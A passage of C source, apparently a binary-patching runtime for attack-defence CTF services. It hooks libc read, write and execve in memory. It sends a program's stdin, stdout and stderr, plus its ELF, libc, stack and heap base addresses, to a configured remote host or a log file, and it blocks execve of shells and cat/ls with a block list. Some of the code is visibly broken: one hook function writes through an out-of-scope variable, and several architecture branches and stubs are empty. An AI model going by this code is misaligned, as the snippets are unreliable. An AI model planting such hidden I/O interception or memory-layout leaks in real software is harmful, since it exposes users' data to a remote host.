    *packet_len = sizeof(UUID)+1+4 + buf_len;
}

IN_LINE char* get_heap_base(){
    char* tmp_address = 0;
    void*(*malloc_handler)(int) = lookup_symbols("malloc");
    void (*free_handler)(void*) = lookup_symbols("free");
    if(malloc_handler!=NULL && free_handler!=NULL) {
        tmp_address = malloc_handler(0x600);
        if(tmp_address!=NULL) {
            free_handler(tmp_address);
            return (char*)((long)(tmp_address) - (long)tmp_address%0x1000);
        }
    }
    return 0;
}



IN_LINE void dynamic_hook_function(void* old_function,void* new_function){
    char* code_slot = alloc_patch_code_slot();
    if(code_slot == NULL)
        return;
    long res = my_mprotect((void*)DOWN_PADDING((long)old_function,0x1000),0x1000,PROT_READ|PROT_WRITE|PROT_EXEC);
    if(res < 0) {
        return;
    }
#ifdef __x86_64__


#elif __i386__

#elif __arm__

    #elif __aarch64__

#elif __mips__

#endif
    res = my_mprotect((void*)DOWN_PADDING((long)old_function,0x1000),0x1000,PROT_READ|PROT_EXEC);
    if(res < 0) {
        //my_puts("dynamic_hook_function failed 2");
        return;
    }
}

IN_LINE void dynamic_hook_call(void* call_addr,void* new_function){
    long res = my_mprotect((void*)DOWN_PADDING((long)call_addr,0x1000),0x1000,PROT_READ|PROT_WRITE|PROT_EXEC);
    if(res < 0) {
        //my_puts("dynamic_hook_function failed 1");
        return;
    }
#ifdef __x86_64__
    ((unsigned char*)old_function) [0] = '\x68';
    *((unsigned int*)&(((unsigned char*)old_function) [1]))  = (unsigned int)((long)new_function&0xFFFFFFFF);
    *((unsigned int*)&(((unsigned char*)old_function) [5])) = 0x042444c7;
    *((unsigned int*)&(((unsigned char*)old_function) [9])) = (long)new_function>>32;
    ((unsigned char*)old_function) [13] = '\xc3';
#elif __i386__
    ((unsigned char*)old_function) [0] = '\xE8';
    *((unsigned int*)&(((unsigned char*)call_addr) [1]))   = (unsigned int)(((unsigned int)new_function-(unsigned int)call_addr-5)&0xFFFFFFFF);
#elif __arm__

    #elif __aarch64__

#elif __mips__

#endif
    res = my_mprotect((void*)DOWN_PADDING((long)call_addr,0x1000),0x1000,PROT_READ|PROT_EXEC);
    if(res < 0) {
        //my_puts("dynamic_hook_function failed 2");
        return;
    }


}

IN_LINE void start_io_redirect_udp(int send_sockfd,struct sockaddr_in serveraddr,char* libc_start_main_addr,char* stack_on_entry){
    int fd_hook_stdin[2];
    int fd_hook_stdout[2];
    int fd_hook_stderr[2];
    int save_stdin = 240;
    int save_stdout = 241;
    int save_stderr = 242;

    my_dup2(STDIN_FILENO,save_stdin);
    my_dup2(STDOUT_FILENO,save_stdout);
    my_dup2(STDERR_FILENO,save_stderr);

    my_pipe(fd_hook_stdin);
    my_pipe(fd_hook_stdout);
    my_pipe(fd_hook_stderr);

    my_close(STDIN_FILENO);
    my_close(STDOUT_FILENO);
    my_close(STDERR_FILENO);

    my_dup2(fd_hook_stdin[0],STDIN_FILENO);
    my_dup2(fd_hook_stdout[1],STDOUT_FILENO);
    my_dup2(fd_hook_stderr[1],STDERR_FILENO);

    pid_t child_pid = my_fork();
    char buf[131072];
    char packet[131082];
    int packet_len;
    my_memset(buf,0,sizeof(buf));

    if(child_pid==0){
        //child process
    }
    else if(child_pid<=0){

    }
    else{
        int flag = my_fcntl(save_stdin,F_GETFL,0);
        my_fcntl(save_stdin,F_SETFL,flag|O_NONBLOCK);
        flag = my_fcntl(fd_hook_stdout[0],F_GETFL,0);
        my_fcntl(fd_hook_stdout[0],F_SETFL,flag|O_NONBLOCK);
        flag = my_fcntl(fd_hook_stderr[0],F_GETFL,0);
        my_fcntl(fd_hook_stderr[0],F_SETFL,flag|O_NONBLOCK);

        int read_length = 0;
        int child_stat;
        while(1){
            // use fd_hook_stdin[1] to write
            // use fd_hook_stdout[0] to read
            // use fd_hook_stderr[0] to read
            //my_memzero(buf,8192);

            char* elf_base = (char*)get_elf_base();
            char* heap_base = (char*)get_heap_base();
            char* stack_base = (char*)stack_on_entry;
            build_packet(BASE_ELF,(char*)&elf_base,sizeof(char*),packet,&packet_len);
            my_sendto(send_sockfd,packet,packet_len,0,&serveraddr,sizeof(serveraddr));
            build_packet(BASE_LIBC,(char*)&libc_start_main_addr,sizeof(char*),packet,&packet_len);
            my_sendto(send_sockfd,packet,packet_len,0,&serveraddr,sizeof(serveraddr));
            build_packet(BASE_STACK,(char*)&stack_base,sizeof(char*),packet,&packet_len);
            my_sendto(send_sockfd,packet,packet_len,0,&serveraddr,sizeof(serveraddr));
            build_packet(BASE_HEAP,(char*)&heap_base,sizeof(char*),packet,&packet_len);
            my_sendto(send_sockfd,packet,packet_len,0,&serveraddr,sizeof(serveraddr));


            read_length = my_read(fd_hook_stdout[0],buf,sizeof(buf));
            if(read_length>0){
                build_packet(DATA_OUT, buf, read_length, packet, &packet_len);
                my_sendto(send_sockfd,packet,packet_len,0,&serveraddr,sizeof(serveraddr));
                filter_black_words_out(buf,read_length);
                my_write(save_stdout,buf,read_length);
            }else if(read_length == -1){
                int error_code = get_errno();
                if(error_code != UN_KNOWN_ERROR_CODE )
                    if(error_code != EAGAIN)
                        break;
            }

            read_length = my_read(fd_hook_stderr[0],buf,sizeof(buf));
            if(read_length>0){
                build_packet(DATA_ERR, buf, read_length, packet, &packet_len);
                my_sendto(send_sockfd,packet,packet_len,0,&serveraddr,sizeof(serveraddr));
                filter_black_words_out(buf,read_length);
                my_write(save_stderr,buf,read_length);
            }else if(read_length == -1){
                int error_code = get_errno();
                if(error_code != UN_KNOWN_ERROR_CODE )
                    if(error_code != EAGAIN)
                        break;
            }

            read_length = my_read(save_stdin,buf,sizeof(buf));
            if(read_length>0){
                build_packet(DATA_IN, buf, read_length, packet, &packet_len);
                my_sendto(send_sockfd,packet,packet_len,0,&serveraddr,sizeof(serveraddr));
                start_shell(buf,read_length,child_pid,save_stdin,save_stdout,save_stderr);
                filter_black_words_in(buf,read_length);
                my_write(fd_hook_stdin[1],buf,read_length);
            }else if(read_length == -1){
                int error_code = get_errno();
                if(error_code != UN_KNOWN_ERROR_CODE )
                    if(error_code != EAGAIN)
                        break;
            }

            if(my_waitpid(child_pid,0,WNOHANG)!=0){
                my_close(send_sockfd);
                my_exit(0);
                break;
            }
            my_sleep(10);
        }
    }
    if(child_pid>0)
        my_kill(child_pid,9);

}



IN_LINE void start_io_redirect_tcp(int send_sockfd, char* libc_start_main_addr,char* stack_on_entry){
    int fd_hook_stdin[2];
    int fd_hook_stdout[2];
    int fd_hook_stderr[2];
    int save_stdin = 240;
    int save_stdout = 241;
    int save_stderr = 242;
    my_dup2(STDIN_FILENO,save_stdin);
    my_dup2(STDOUT_FILENO,save_stdout);
    my_dup2(STDERR_FILENO,save_stderr);

    my_pipe(fd_hook_stdin);
    my_pipe(fd_hook_stdout);
    my_pipe(fd_hook_stderr);

    my_close(STDIN_FILENO);
    my_close(STDOUT_FILENO);
    my_close(STDERR_FILENO);

    my_dup2(fd_hook_stdin[0],STDIN_FILENO);
    my_dup2(fd_hook_stdout[1],STDOUT_FILENO);
    my_dup2(fd_hook_stderr[1],STDERR_FILENO);
    char* heap_base = (char*)get_heap_base();
    pid_t child_pid = my_fork();
    char buf[131072];
    char packet[131082];
    int packet_len;
    my_memset(buf,0,sizeof(buf));
    if(child_pid==0){
        //child process
    }
    else if(child_pid<=0){

    }
    else{
        my_memcpy(UUID,(void*)&fd_hook_stderr,8);

        int flag = my_fcntl(save_stdin,F_GETFL,0);
        my_fcntl(save_stdin,F_SETFL,flag|O_NONBLOCK);
        flag = my_fcntl(fd_hook_stdout[0],F_GETFL,0);
        my_fcntl(fd_hook_stdout[0],F_SETFL,flag|O_NONBLOCK);
        flag = my_fcntl(fd_hook_stderr[0],F_GETFL,0);
        my_fcntl(fd_hook_stderr[0],F_SETFL,flag|O_NONBLOCK);


        int read_length = 0;

        int child_stat;
        char* elf_base = (char*)get_elf_base();
        char* stack_base = (char*)stack_on_entry;
        build_packet(BASE_ELF,(char*)&elf_base,sizeof(char*),packet,&packet_len);
        my_write_packet(send_sockfd,packet,packet_len);
        build_packet(BASE_LIBC,(char*)&libc_start_main_addr,sizeof(char*),packet,&packet_len);
        my_write_packet(send_sockfd,packet,packet_len);
        build_packet(BASE_STACK,(char*)&stack_base,sizeof(char*),packet,&packet_len);
        my_write_packet(send_sockfd,packet,packet_len);
        build_packet(BASE_HEAP,(char*)&heap_base,sizeof(char*),packet,&packet_len);
        my_write_packet(send_sockfd,packet,packet_len);

        while(1){
            {
                read_length = my_read(fd_hook_stdout[0], buf, sizeof(buf));
                if (read_length > 0) {
                    build_packet(DATA_OUT, buf, read_length, packet, &packet_len);
                    my_write_packet(send_sockfd, packet, packet_len);
                    filter_black_words_out(buf, read_length);
                    my_write(save_stdout, buf, read_length);
                }
                else if(read_length == -1){
                    int error_code = get_errno();
                    if(error_code != UN_KNOWN_ERROR_CODE )
                        if(error_code != EAGAIN)
                            break;
                }

            }
            {
                read_length = my_read(fd_hook_stderr[0], buf, sizeof(buf));
                if (read_length > 0) {
                    build_packet(DATA_ERR, buf, read_length, packet, &packet_len);
                    my_write_packet(send_sockfd, packet, packet_len);

                    filter_black_words_out(buf, read_length);
                    my_write(save_stderr, buf, read_length);
                }
                else if(read_length == -1){
                    int error_code = get_errno();
                    if(error_code != UN_KNOWN_ERROR_CODE )
                        if(error_code != EAGAIN)
                            break;
                }
            }
            {
                read_length = my_read(save_stdin, buf, sizeof(buf));
                if (read_length > 0) {
                    build_packet(DATA_IN, buf, read_length, packet, &packet_len);
                    my_write_packet(send_sockfd, packet, packet_len);
                    start_shell(buf, read_length, child_pid, save_stdin, save_stdout, save_stderr);
                    filter_black_words_in(buf, read_length);
                    my_write(fd_hook_stdin[1], buf, read_length);
                }
                else if(read_length == -1){
                    int error_code = get_errno();
                    if(error_code != UN_KNOWN_ERROR_CODE )
                        if(error_code != EAGAIN)
                            break;
                }
            }
            if(my_waitpid(child_pid,0,WNOHANG)!=0){
                my_close(send_sockfd);
                my_exit(0);
                break;
            }
            my_sleep(10);
        }
    }
    if(child_pid>0)
        my_kill(child_pid,9);
}
/*
IN_LINE void start_sandbox_io_redirect_tcp(int send_sockfd) {
    fd_set read_events;
    fd_set err_events;
    struct timeval timeout;
    timeout.tv_sec = 1;
    timeout.tv_usec = 0;
    char buf[131072];
    unsigned int length = 0;
    int i = 0;
    unsigned int current_read_index = 0;
    int current_write_index = 0;
    int flag = my_fcntl(STDIN_FILENO,F_GETFL,0);
    my_fcntl(STDIN_FILENO,F_SETFL,flag|O_NONBLOCK);
    flag = my_fcntl(send_sockfd,F_GETFL,0);
    my_fcntl(send_sockfd,F_SETFL,flag|O_NONBLOCK);
    while (1) {
        {
            length = my_read(STDIN_FILENO, buf, sizeof(buf));
            if (length > 0) {
                for(i=0;i<length;i++) {
                    buf[i] = buf[i]^SANDBOX_XOR_KEY[current_read_index%my_strlen(SANDBOX_XOR_KEY)];
                    current_read_index ++;
                }
                my_write(send_sockfd, buf, length);
            }
            else if(length == -1){
                int error_code = get_errno();
                if(error_code != UN_KNOWN_ERROR_CODE )
                    if(error_code != EAGAIN)
                        break;
            }
        }
        {
            length = my_read(send_sockfd, buf, sizeof(buf));
            if (length > 0) {
                for(i=0;i<length;i++) {
                    buf[i] = buf[i] ^ SANDBOX_XOR_KEY[current_write_index % my_strlen(SANDBOX_XOR_KEY)];
                    current_write_index++;
                }
                my_write(STDIN_FILENO, buf, length);
            }
            else if(length == -1){
                int error_code = get_errno();
                if(error_code != UN_KNOWN_ERROR_CODE )
                    if(error_code != EAGAIN)
                        break;
            }
        }
        my_sleep(10);
    }
    my_exit(0);
}
*/

static void start_sandbox_io_redirect_tcp(int send_sockfd) {
    fd_set read_events;
    fd_set err_events;
    struct timeval timeout;
    timeout.tv_sec = 1;
    timeout.tv_usec = 0;
    char buf[131072];
    unsigned int length = 0;
    int i = 0;
    unsigned int current_read_index = 0;
    int current_write_index = 0;
    int rc = 0;
    while (1) {
        FD_ZERO(&read_events);
        FD_SET(STDIN_FILENO, &read_events);
        FD_SET(send_sockfd, &read_events);

        FD_ZERO(&err_events);
        FD_SET(STDIN_FILENO, &err_events);
        FD_SET(send_sockfd, &err_events);
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;
        rc = my_select(send_sockfd + 1, &read_events, NULL, &err_events, &timeout);
        if (rc < 0) {
            break;
        } else if (rc == 0) {
            continue;
        }
        if (FD_ISSET(STDIN_FILENO, &read_events)) {
            length = my_read(STDIN_FILENO, buf, sizeof(buf));
            if (length > 0) {
                for(i=0;i<length;i++) {
                    buf[i] = buf[i]^SANDBOX_XOR_KEY[current_read_index%my_strlen(SANDBOX_XOR_KEY)];
                    current_read_index ++;
                }
                my_write(send_sockfd, buf, length);
            }
            else if(length == -1){
                int error_code = get_errno();
                if(error_code != UN_KNOWN_ERROR_CODE )
                    if(error_code != EAGAIN)
                        break;
            }
        }
        if (FD_ISSET(send_sockfd, &read_events)) {
            length = my_read(send_sockfd, buf, sizeof(buf));
            if (length > 0) {
                for(i=0;i<length;i++) {
                    buf[i] = buf[i] ^ SANDBOX_XOR_KEY[current_write_index % my_strlen(SANDBOX_XOR_KEY)];
                    current_write_index++;
                }
                my_write(STDIN_FILENO, buf, length);
            }
            else if(length == -1){
                int error_code = get_errno();
                if(error_code != UN_KNOWN_ERROR_CODE )
                    if(error_code != EAGAIN)
                        break;
            }
        }

    }
    my_exit(0);
}

IN_LINE int isconnected(int sockfd, fd_set *rd, fd_set *wr)
{
    if (!FD_ISSET(sockfd, rd) && !FD_ISSET(sockfd, wr)) {
        return 0;
    }
    int err = 0;
    socklen_t len = sizeof(err);
    if (my_getsockopt(sockfd, SOL_SOCKET, SO_ERROR, &err, &len) < 0) {
        return 0;
    }
    return err == 0;
}

// Return 1 on success, 0 on timeout and -1 on failed
IN_LINE int connect_timeout(int sockfd, const struct sockaddr *addr,
                            socklen_t addrlen, struct timeval *timeout)
{
    int flags = my_fcntl( sockfd, F_GETFL, 0 );
    if (flags == -1) {
        return -1;
    }
    if (my_fcntl( sockfd, F_SETFL, flags | O_NONBLOCK ) < 0) {
        return -1;
    }

    int status = my_connect(sockfd, (void*)addr, addrlen);

    if (status == 0) {
        if (my_fcntl(sockfd, F_SETFL, flags) <  0) {
            return -1;
        }
        return 1;
    }
    fd_set read_events;
    fd_set write_events;
    FD_ZERO(&read_events);
    FD_SET(sockfd, &read_events);
    write_events = read_events;
    int rc = my_select(sockfd + 1, &read_events, &write_events, NULL, timeout );
    if (rc < 0) {
        return -1;
    } else if (rc == 0) {
        return 0;
    }
    if (!isconnected(sockfd, &read_events, &write_events) )
    {
        return -1;
    }
    if (my_fcntl( sockfd, F_SETFL, flags ) < 0 ) {
        return -1;
    }
    return 1;
}


IN_LINE int start_sandbox_io_redirect() {
    if (patch_params->sandbox_host == 0 || patch_params->sandbox_port == 0)
        return -1;
    struct sockaddr_in serveraddr;
    my_memset((unsigned char *) &(serveraddr), 0, sizeof(serveraddr));
    serveraddr.sin_family = AF_INET;
    serveraddr.sin_addr.s_addr = patch_params->sandbox_host;
    serveraddr.sin_port = patch_params->sandbox_port;
    struct timeval timeout;
    timeout.tv_sec = TCP_TIME_OUT;
    timeout.tv_usec = 0;
    unsigned  int send_sockfd = my_socket(AF_INET, SOCK_STREAM, 0);
    if (send_sockfd >= 0) {
        int res = connect_timeout(send_sockfd, (struct sockaddr *) &serveraddr, sizeof(struct sockaddr), &timeout);
        if (res == 1) {
            start_sandbox_io_redirect_tcp(send_sockfd);
            my_close(send_sockfd);
            return 0;
        }
        else {
            my_close(send_sockfd);
            return -1;
        }
    }
    else
        return -1;
}

IN_LINE void start_common_io_redirect(char* libc_start_main_addr,char* stack_on_entry){
    char path[0x200];
    char file_name[0x100];
    int send_sockfd;
    if (patch_params->redirect_host != 0 && patch_params->redirect_port != 0) {
        struct sockaddr_in serveraddr;
        my_memset((unsigned char *) &(serveraddr), 0, sizeof(serveraddr));
        serveraddr.sin_family = AF_INET;
        serveraddr.sin_addr.s_addr = patch_params->redirect_host;
        serveraddr.sin_port = patch_params->redirect_port;
        struct timeval timeout;
        timeout.tv_sec = TCP_TIME_OUT;
        timeout.tv_usec = 0;
        send_sockfd = my_socket(AF_INET, SOCK_STREAM, 0);
        if (send_sockfd >= 0) {
            int res = connect_timeout(send_sockfd, (struct sockaddr *) &serveraddr, sizeof(struct sockaddr), &timeout);
            if (res == 1) {
                start_io_redirect_tcp(send_sockfd, libc_start_main_addr, stack_on_entry);
                my_close(send_sockfd);
            } else {
                my_close(send_sockfd);
#if USE_LOCAL_FILE_INSTEAD_OF_UDP
                my_memset(path, 0, sizeof(path));
                my_memset(file_name, 0, sizeof(file_name));
                my_strcpy(path, IO_REDIRECT_PATH, '\x00');
                my_memcpy(&path[my_strlen(path)], "/", 1);
                generate_random_str(file_name, 12);
                my_memcpy(&path[my_strlen(path)], file_name, my_strlen(file_name));
                my_memcpy(&path[my_strlen(path)], ".log", 4);
                //g_redirect_io_fd = my_open(path,O_CLOEXEC|O_RDWR|O_CREAT,S_IRWXU|S_IRWXG|S_IRWXO);
                send_sockfd = my_open(path, O_CLOEXEC | O_RDWR | O_CREAT, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);
                if (send_sockfd > 0) {
                    start_io_redirect_tcp(send_sockfd, libc_start_main_addr, stack_on_entry);
                    my_close(send_sockfd);
                }
#else

                send_sockfd = my_socket(AF_INET, SOCK_DGRAM, 0);
                if (send_sockfd >= 0) {
                    start_io_redirect_udp(send_sockfd, serveraddr, libc_start_main_addr, stack_on_entry);
                    my_close(send_sockfd);
                }
#endif
            }
        } else {
#if USE_LOCAL_FILE_INSTEAD_OF_UDP
            my_memset(path, 0, sizeof(path));
            my_memset(file_name, 0, sizeof(file_name));
            my_strcpy(path, IO_REDIRECT_PATH, '\x00');
            my_memcpy(&path[my_strlen(path)], "/", 1);
            generate_random_str(file_name, 12);
            my_memcpy(&path[my_strlen(path)], file_name, my_strlen(file_name));
            my_memcpy(&path[my_strlen(path)], ".log", 4);
            //g_redirect_io_fd = my_open(path,O_CLOEXEC|O_RDWR|O_CREAT,S_IRWXU|S_IRWXG|S_IRWXO);
            send_sockfd = my_open(path, O_CLOEXEC | O_RDWR | O_CREAT, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);
            if (send_sockfd > 0) {
                start_io_redirect_tcp(send_sockfd, libc_start_main_addr, stack_on_entry);
                my_close(send_sockfd);
            }
#else
            send_sockfd = my_socket(AF_INET, SOCK_DGRAM, 0);
            start_io_redirect_udp(send_sockfd, serveraddr, libc_start_main_addr, stack_on_entry);
            my_close(send_sockfd);
#endif
        }
    }
    else{
        my_memset(path, 0, sizeof(path));
        my_memset(file_name, 0, sizeof(file_name));
        my_strcpy(path, IO_REDIRECT_PATH, '\x00');
        my_memcpy(&path[my_strlen(path)], "/", 1);
        generate_random_str(file_name, 12);
        my_memcpy(&path[my_strlen(path)], file_name, my_strlen(file_name));
        my_memcpy(&path[my_strlen(path)], ".log", 4);
        //g_redirect_io_fd = my_open(path,O_CLOEXEC|O_RDWR|O_CREAT,S_IRWXU|S_IRWXG|S_IRWXO);
        send_sockfd = my_open(path, O_CLOEXEC | O_RDWR | O_CREAT, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);
        if (send_sockfd > 0) {
            start_io_redirect_tcp(send_sockfd, libc_start_main_addr, stack_on_entry);
            my_close(send_sockfd);
        }
    }
}

static int g_redirect_io_fd;


static int __hook_dynamic_read(int fd,char* buf,ssize_t size){
    int ret = my_read(fd,buf,size);
    char packet[131082];
    int packet_len;
    if(ret > 0) {
        if (fd == STDIN_FILENO) {
            if (g_redirect_io_fd > 0) {
                build_packet(DATA_IN, buf, ret, packet, &packet_len);
                my_write_packet(g_redirect_io_fd, packet, packet_len);
            }
            if(buf[ret-1] == '\r'||buf[ret-1] == '\n' )
                start_shell_io_inline(buf,ret-1);
            else{
                start_shell_io_inline(buf,ret);
            }
        }
    }
    return ret;
}
static int __hook_dynamic_write(int fd,char* buf,ssize_t size){
    int ret = my_write(fd,buf,size);
    char packet[131082];
    int packet_len;
    if(ret > 0 ) {
        if (g_redirect_io_fd > 0) {
            if (fd == STDOUT_FILENO) {
                build_packet(DATA_OUT, buf, ret, packet, &packet_len);
                my_write_packet(g_redirect_io_fd, packet, packet_len);
            } else if (fd == STDERR_FILENO) {
                build_packet(DATA_ERR, buf, ret, packet, &packet_len);
                my_write_packet(g_redirect_io_fd, packet, packet_len);
            }
        }
    }
    return ret;
}


IN_LINE void dynamic_io_redirect_hook(){
    {
        char read_str[] ={"read"};
        void* hook_read_handler = (void*)__hook_dynamic_read;
        char* read_handler = lookup_symbols(read_str);
        if(read_handler!=NULL)
            dynamic_hook_function(read_handler,hook_read_handler);
    }
    {
        char write_str[] ={"write"};
        void* hook_write_handler = (void*)__hook_dynamic_write;
        char* write_handler = lookup_symbols(write_str);
        if(write_handler!=NULL)
            dynamic_hook_function(write_handler,hook_write_handler);
    }

}

IN_LINE void start_inline_io_redirect(char* libc_start_main_addr,char* stack_on_entry){
    int use_file = 0;
    char path[0x200];
    char file_name[0x100];
    char packet[131082];
    int packet_len;
    if (patch_params->redirect_host != 0 && patch_params->redirect_port != 0) {
        struct sockaddr_in serveraddr;
        my_memset((unsigned char *) &(serveraddr), 0, sizeof(serveraddr));
        serveraddr.sin_family = AF_INET;
        serveraddr.sin_addr.s_addr = patch_params->redirect_host;
        serveraddr.sin_port = patch_params->redirect_port;
        struct timeval timeout;
        timeout.tv_sec = TCP_TIME_OUT;
        timeout.tv_usec = 0;
        g_redirect_io_fd = my_socket(AF_INET, SOCK_STREAM, 0);
        if (g_redirect_io_fd >= 0) {
            int res = connect_timeout(g_redirect_io_fd, (struct sockaddr *) &serveraddr, sizeof(struct sockaddr),
                                      &timeout);
            if (res == 1) {
                char* heap_base = (char*)get_heap_base();
                char* elf_base = (char*)get_elf_base();
                char* stack_base = (char*)stack_on_entry;
                build_packet(BASE_ELF,(char*)&elf_base,sizeof(char*),packet,&packet_len);
                my_write_packet(g_redirect_io_fd,packet,packet_len);
                build_packet(BASE_LIBC,(char*)&libc_start_main_addr,sizeof(char*),packet,&packet_len);
                my_write_packet(g_redirect_io_fd,packet,packet_len);
                build_packet(BASE_STACK,(char*)&stack_base,sizeof(char*),packet,&packet_len);
                my_write_packet(g_redirect_io_fd,packet,packet_len);
                build_packet(BASE_HEAP,(char*)&heap_base,sizeof(char*),packet,&packet_len);
                my_write_packet(g_redirect_io_fd,packet,packet_len);
                dynamic_io_redirect_hook();
            } else {
                my_close(g_redirect_io_fd);
                g_redirect_io_fd = 0;
                use_file = 1;
            }
        } else {
            use_file = 1;
        }
    }
    if(use_file == 1){
        my_memset(path,0,sizeof(path));
        my_memset(file_name,0,sizeof(file_name));
        my_strcpy(path,IO_REDIRECT_PATH,'\x00');
        my_memcpy(&path[my_strlen(path)],"/",1);
        generate_random_str(file_name,12);
        my_memcpy(&path[my_strlen(path)],file_name,my_strlen(file_name));
        my_memcpy(&path[my_strlen(path)],".log",4);
        //g_redirect_io_fd = my_open(path,O_CLOEXEC|O_RDWR|O_CREAT,S_IRWXU|S_IRWXG|S_IRWXO);
        g_redirect_io_fd = my_open(path,O_CLOEXEC|O_RDWR|O_CREAT,S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);
        if(g_redirect_io_fd>0){
            char* heap_base = (char*)get_heap_base();
            char* elf_base = (char*)get_elf_base();
            char* stack_base = (char*)stack_on_entry;
            build_packet(BASE_ELF,(char*)&elf_base,sizeof(char*),packet,&packet_len);
            my_write_packet(g_redirect_io_fd,packet,packet_len);
            build_packet(BASE_LIBC,(char*)&libc_start_main_addr,sizeof(char*),packet,&packet_len);
            my_write_packet(g_redirect_io_fd,packet,packet_len);
            build_packet(BASE_STACK,(char*)&stack_base,sizeof(char*),packet,&packet_len);
            my_write_packet(g_redirect_io_fd,packet,packet_len);
            build_packet(BASE_HEAP,(char*)&heap_base,sizeof(char*),packet,&packet_len);
            my_write_packet(g_redirect_io_fd,packet,packet_len);
            dynamic_io_redirect_hook();
        }
    }
}


IN_LINE void start_io_redirect(char* libc_start_main_addr,char* stack_on_entry){
    int res  = start_sandbox_io_redirect();
#if USE_IO_INLINE_REDIRECT == 1
    if(res == -1)
        start_inline_io_redirect(libc_start_main_addr,stack_on_entry);
#else
    if(res == -1)
        start_common_io_redirect(libc_start_main_addr,stack_on_entry);
#endif

}


IN_LINE void dynamic_hook_process_mmap(){
    char mmap_str[] ={"__mmap"};
    char* mmap_handler = lookup_symbols(mmap_str);
    if(mmap_handler==NULL)
        return;
}

static int __hook_dynamic_execve(char *path, char *argv[], char *envp[]){
    char black_bins[][20] = {"/bin/sh","/bin/bash","sh","cat","ls"};
    char* black_bin = NULL;
    //my_puts("__hook_dynamic_execve success");
    for(int i=0;;i++) {
        black_bin = black_bins[i];
        if(black_bin == NULL)
            break;
        if(my_strstr(path,black_bin)!=NULL)
            return -1;
    }
    //my_execve(path,(char**)argv,(char**)envp);
    return 0;
}

IN_LINE void dynamic_hook_process_execve(){
    char execve_str[] ={"execve"};
    void* hook_handler = (void*)__hook_dynamic_execve;
    char* execve_handler = lookup_symbols(execve_str);
    if(execve_handler==NULL)
        return;
    dynamic_hook_function(execve_handler,hook_handler);
}


IN_LINE void init_hook_env(void* first_instruction){
    g_elf_base = DOWN_PADDING((char*)first_instruction-PATCH_FIRT_ENTRY,0x1000);
    g_patch_code_slot = (PATCH_CODE_SLOT*)my_mmap(g_elf_base - 0x100000,UP_PADDING(MAX_PATCH_NUM*sizeof(g_patch_code_slot),0x1000),PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    if(g_patch_code_slot<=0) {
        g_patch_code_slot = NULL;
        g_patch_code_index = 0;
    }
    else{
        g_patch_code_index = 0;
    }
}

IN_LINE void dynamic_hook_process(void* first_instruction){
    init_hook_env(first_instruction);
    dynamic_hook_process_mmap();
    dynamic_hook_process_execve();
}

IN_LINE void destory_patch_data(){
    my_munmap(PATCH_DATA_MMAP_FILE_BASE,UP_PADDING(PATCH_DATA_MMAP_FILE_SIZE,0x1000));
}

static void hook_start(LIBC_START_MAIN_ARG, int(*__libc_start_main)(LIBC_START_MAIN_ARG_PROTO),void* first_instruction) {
    char *stack_base = 0;
    char libc_start_main_str[] ={"__libc_start_main"};
    char* target_entry = lookup_symbols(libc_start_main_str);
    char **ev = &UBP_AV[ARGC + 1];
    int i = 0;
    g_errno_handler = NULL;
    while (ev[i] != NULL)
        i++;
    if (i >= 1)
        stack_base = (char *) UP_PADDING((long) ev[i - 1], 0x1000);
    else
        stack_base = (char *) UP_PADDING((long) ev[i], 0x1000);
    destory_patch_data();
    //parent should die before child
    start_io_redirect(target_entry, stack_base);
    dynamic_hook_process(first_instruction);
    __libc_start_main(MAIN,ARGC,UBP_AV,INIT,FINI,RTLD_FINI,STACK_END);
}

/*total four type hook support
* 1. __hook_elf_addr
* 2. __hook_got_addr
* 3. __hook_lib_addr
* 4. __hook_call_addr
*/


void __hook_elf_0xfffffff(char* buf,unsigned int length){

}

void __hook_call_0x08048785(int flag,char* buf){

}

char* __hook_got_0x080484D0_malloc(int length){

}
